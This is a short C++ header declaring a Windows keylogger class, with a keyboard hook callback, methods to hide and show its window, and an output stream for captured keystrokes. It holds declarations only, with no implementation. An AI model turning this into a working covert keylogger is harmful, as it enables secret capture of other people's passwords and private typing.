#pragma once
#include <string>
#include <Windows.h>

class keylogger
{
public:
    keylogger(std::ostream* out);
    ~keylogger();

    void run() const;
    void hide_window() const;
    void show_window() const;
private:
    void hook();
    void unhook() const;

    static LRESULT CALLBACK hook_process(int code, WPARAM wparam, LPARAM lparam);
    static keylogger* this_;

    HHOOK hhok_;
    std::ostream* out_;
};